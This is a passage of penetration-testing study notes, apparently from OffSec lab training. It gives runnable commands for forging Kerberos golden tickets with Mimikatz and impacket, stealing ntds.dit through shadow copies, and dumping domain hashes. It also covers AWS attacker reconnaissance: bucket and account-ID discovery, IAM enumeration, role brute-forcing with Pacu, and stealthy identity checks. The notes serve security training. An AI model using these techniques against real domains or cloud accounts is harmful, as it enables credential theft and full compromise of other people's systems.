impacket-psexec [domain]/[user]@[hostname] -k -no-pass

```

***Windows - Mimikatz***

```powershell
privilege::debug
lsadump::lsa /inject /name:krbtgt
kerberos::purge

## Submit ticket to current session
kerberos::golden /user:[user] /domain:[domain] /sid:[domainSID] /krbtgt:[krbtgt hash] /ptt

## Save ticket
kerberos::golden /user:[user] /domain:[domain] /sid:[domainSID] /krbtgt:[krbtgt hash] /ticket:golden.kirbi

kerberos::ptt goldem.kirbi

## Ticket in use
.\PsExec.exe \\[hostname] cmd
```

[Golden Ticket - HackTricks](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/golden-ticket.html)

#### **Shadow Copies**

<aside>
💡

To manage volume shadow copies, the Microsoft signed binary [*vshadow.exe*](https://learn.microsoft.com/en-us/windows/win32/vss/vshadow-tool-and-sample)
is offered as part of the [Windows SDK](https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/).

</aside>

***Store the copy on disk***

```powershell
vshadow.exe -nw -p  C:

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```

***Save the SYSTEM hive from the Windows registry***

```powershell
reg.exe save hklm\system c:\system.bak
```

***Extract ntds database locally***

```powershell
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

## **Enumerating AWS Cloud Infrastructure**

### **Reconnaissance of Cloud Resources on the Internet**

#### **Domain and Subdomain Reconnaissance**

<aside>
💡

The EC2 instance is a virtual machine in the AWS cloud. EC2 is a common service used to host websites, applications, and other services that require a server.

</aside>

***Enumerate DNS***

```bash
dnsenum [domain] --threads 100
```

#### Service-specific Domains

***Wordlist*** - `/usr/lib/cloud-enum/enum_tools/fuzz.txt`

***Enumerate Buckets using cloud_enum***

```bash
cloud_enum -k [bucket] --quickscan --disable-azure --disable-gcp
cloud_enum -kf [bucket wordlist] --quickscan --disable-azure --disable-gcp

## example
cloud_enum -k offseclab-assets-public-axevtewi --quickscan --disable-azure --disable-gcp

cloud_enum -kf keyfile.txt --quickscan --disable-azure --disable-gcp
```

### **Reconnaissance via Cloud Service Provider's API**

#### **Configure AWS CLI**

***Create AWS Profile***

```bash
aws configure --profile [AnyName]

aws configure list-profiles
```

***Interact with AWS Profile***

```bash
aws --profile [CreatedProfile] [command]

## example
aws --profile [CreatedProfile] sts get-caller-identity
aws --profile [CreatedProfile] s3 ls 
aws --profile [CreatedProfile] s3 ls s3://[bucker] --recursive
```

#### **Publicly Shared Resources**

***Get Publicly Available Images***

- **ec2 describe-images -** list all the images that the account can read
- **owners amazon -** filter this list and show only AMIs provided by AWS
- **executable-users all** - ensure that all public AMIs will be listed

```bash
aws --profile attacker ec2 describe-images --owners amazon --executable-users all
```

***Get Publicly Available Images Owend by Other User***

```bash
aws --profile attacker ec2 describe-images --executable-users all --filters "Name=description,Values=*Domain*"

aws --profile attacker ec2 describe-images --executable-users all --filters "Name=name,Values=*Domain*"
```

***Get Publicly Available Snapshots***

```bash
aws --profile attacker ec2 describe-snapshots 

aws --profile attacker ec2 describe-snapshots --filters "Name=description,Values=*Domain*"

aws --profile attacker ec2 describe-snapshots --filters "Name=name,Values=*Domain*"
```

#### **Obtaining Account IDs from S3 Buckets**

First, we'll choose a publicly readable bucket or object inside the target account. Because the bucket/object is publicly readable, we should be able to list the content of it with any IAM user of any AWS account. In the lab, we'll choose one of the publicly readable buckets.

Then, we'll create a new IAM user in our *attacker* account. By default, IAM users don't have any permissions to execute any actions, so the new user won't be able to list the content of the public resource even when it's public.

Next, we'll create a policy that will grant permissions to *list buckets* and *read objects*. However, we'll add the *Condition* that the *read* permission will only apply if the account ID that owns the bucket starts with the digit "x".

After we apply the policy to the new IAM user, we'll test if we can list the bucket with the new user's credentials. We'll test the value *x* from 0 to 9 until we can list the bucket, meaning that we found the first digit of the account.

Check the public resource

```bash
aws --profile [profile] s3 ls [public bucket]
```

***Create new AIM user and assign KEYs***

```bash
aws --profile [attacker profile] iam create-user --user-name [username]

aws --profile [attacker profile] iam create-access-key --user-name [username]
```

***Configure Profile for Newly created IAM User***

```bash
aws configure --profile [created IAM user]

aws --profile [created IAM user] sts get-caller-identity
```

***Check access to Private Bucket***

```bash
aws --profile [profile] s3 ls [bucket]

## example
aws --profile enum s3 ls offseclab-assets-private-kaykoour
```

***Create a policy that will allow for listing the content of the bucket and reading objects inside it - Condition = if AccountID starts with X***

```bash
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowResourceAccount",
            "Effect": "Allow",
            "Action": [
                "s3:ListBucket",
                "s3:GetObject"
            ],
            "Resource": "*",
            "Condition": {
                "StringLike": {"s3:ResourceAccount": ["0*"]}
            }
        }
    ]
}
```

***Assign Policy to Created IAM User***

```bash
aws --profile [attacker profile] iam put-user-policy \
--user-name [created IAM user] \
--policy-name [Policy Name] \
--policy-document file://[filename]

aws --profile [attacker profile] iam list-user-policies --user-name [created IAM user]

## Example
aws --profile attacker iam put-user-policy \
--user-name enum \
--policy-name s3-read \
--policy-document file://policy-s3-read.json
aws --profile attacker iam list-user-policies --user-name enum
```

***Check the access with defined conditions using created IAM user***

```bash
aws --profile [created IAM user] s3 ls [bucket]

## example
aws --profile enum s3 ls offseclab-assets-private-kaykoour
```

***Once we know that the policy starts with a digit, we can move to the next one by modifying the condition of the policy like so:***

```bash
- __"StringLike": {"s3:ResourceAccount": ["10*"]}__
- __"StringLike": {"s3:ResourceAccount": ["11*"]}__
...
- __"StringLike": {"s3:ResourceAccount": ["18*"]}__
- __"StringLike": {"s3:ResourceAccount": ["19*"]}__
```

***Automated Tool***

[GitHub - WeAreCloudar/s3-account-search: S3 Account Search](https://github.com/WeAreCloudar/s3-account-search?tab=readme-ov-file)

#### **Enumerating IAM Users in Other Accounts**

***Create an S3 bucket inside our attacker's account***

```bash
aws --profile [attacker profile] s3 mb s3://offseclab-dummy-bucket-$RANDOM-$RANDOM-$RANDOM
```

***Create policy that apply exist / nonexist users - Change Resource and Principal***

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowUserToListBucket",
            "Effect": "Allow",
            "Resource": "arn:aws:s3:::offseclab-dummy-bucket-28967-25641-13328",
            "Principal": {
                "AWS": ["arn:aws:iam::123456789012:user/cloudadmin"]
            },
            "Action": "s3:ListBucket"

        }
    ]
}
```

***Apply the created policy and check the response***

```bash
aws --profile [attacker profile] s3api put-bucket-policy --bucket [created bucket] --policy file://[file.json]

## example
aws --profile attacker s3api put-bucket-policy --bucket offseclab-dummy-bucket-28967-25641-13328 --policy file://grant-s3-bucket-read.json
```

***Automated Brute Force Roles using Pacu***

```bash
Pacu
What would you like to name this new session? [domain]
Pacu (offseclab:No Keys Set) > import_keys attacker
Pacu (offseclab:imported-attacker) > ls
Pacu (offseclab:imported-attacker) > help iam__enum_roles
Pacu (offseclab:imported-attacker) > run iam__enum_roles --word-list /tmp/role-names.txt --account-id [accountId]

```

***Set New Environment Credentials***

```bash
aws configure set aws_access_key_id [access keyId] --profile roleprofile
aws configure set aws_secret_access_key [access key] --profile roleprofile
aws configure set aws_session_token [session token] --profile roleprofile
aws configure set region us-east-1 --profile roleprofile
aws configure set output json --profile roleprofile
```

### **Initial IAM Reconnaissance**

#### **Examining Compromised Credentials**

***Get IAM User Details***

```bash
aws --profile [profile] sts get-caller-identity
```

***Get IAM User Account using AccessKeyID***

```bash
aws --profile [profile] sts get-access-key-info --access-key-id [key]
```

***Get IAM User Details Without Logged in events/cloudtrails***

```bash
aws --profile [profile] lambda invoke --function-name arn:aws:lambda:us-east-1:123456789012:function:nonexistent-function outfile
```

#### **Scoping IAM permissions**

<aside>
💡

**Inline Policies** are directly linked to a single identity and exist only in that identity space. **Managed Policies** stand as distinct, reusable policies that can be associated with multiple identities.

</aside>

***List inline policies and managed policies associated with the user*** 

```bash
aws --profile [profile] iam list-user-policies --user-name [username]

aws --profile [profile] iam list-attached-user-policies --user-name [username]

## Example
aws --profile target iam list-user-policies --user-name clouddesk-plove

aws --profile target iam list-attached-user-policies --user-name clouddesk-plove
```

***List Groups of User***

```bash
aws --profile [profile] iam list-groups-for-user --user-name [username]
```

***List Policies Associated with Group***

```bash
aws --profile [profile] iam list-group-policies --group-name [group]

aws --profile [profile] iam list-attached-group-policies --group-name [group]

## Example
aws --profile target iam list-group-policies --group-name support

aws --profile target iam list-attached-group-policies --group-name support
```

 ***Check Current Version of the Policy Since Policies Support Versioning***

```bash
aws --profile [profile] iam list-policy-versions --policy-arn "[arn]"

## Example
aws --profile target iam list-policy-versions --policy-arn "arn:aws:iam::aws:policy/job-function/SupportUser"
```

***Check Policy Document With Associated Version***

```bash
aws --profile [profile] iam get-policy-version --policy-arn "[arn]" --version-id [version]

## Example
aws --profile target iam get-policy-version --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v8
```

### **IAM Resources Enumeration**

#### **Enumerating IAM Resources**

***Check what actions this policy grants to enumerate IAM resources***

```bash
aws --profile [profile] iam get-policy-version --policy-arn [arn] --version-id [version] | grep "iam"

## Example
aws --profile target iam get-policy-version --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v8 | grep "iam"
```

***Display a description of the command usage including a list of all available subcommands***

```bash
aws --profile [profile] iam help | grep -E "list-|get-|generate-"

## Example
aws --profile target iam help | grep -E "list-|get-|generate-"
```

***IAM Resource Enumeration Commands***

```bash
iam get-account-summary
iam list-users
iam list-policies --scope Local --only-attached

iam list-user-policies
iam get-user-policy
iam list-group-policies
iam get-group-policy
iam list-role-policies
iam get-role-policy

iam get-account-authorization-details --filter User Group LocalManagedPolicy Role

iam list-policy-versions --policy-arn [arn]
iam get-account-authorization-details --filter LocalManagedPolicy
```

#### **Processing API Response data with JMESPath**

***Filter data using JMESPath***

```bash
aws --profile [profile] iam get-account-authorization-details --filter User --query "UserDetailList[].UserName"

aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[0].[UserName,Path,GroupList]"

aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[?contains(UserName, 'admin')].{Name: UserName}"
```

[JMESPath — JMESPath](https://jmespath.org/)

#### **Running Automated Enumeration with Pacu**

***Inital Access using Pacu***

```bash
kal@kali:~$ Pacu
What would you like to name this new session? [domain]
Pacu (offseclab:No Keys Set) > import_keys [profile]
Pacu (offseclab:imported-attacker) > ls
```

***Example of Listing Users/Roles/Policies/Groups*** 

```bash
help iam__enum_users_roles_policies_groups
run iam__enum_users_roles_policies_groups

services
data IAM
```

#### **Extracting Insights from Enumeration Data**

[https://github.com/ReversecLabs/awspx](https://github.com/ReversecLabs/awspx)

[https://github.com/duo-labs/cloudmapper](https://github.com/duo-labs/cloudmapper)

---

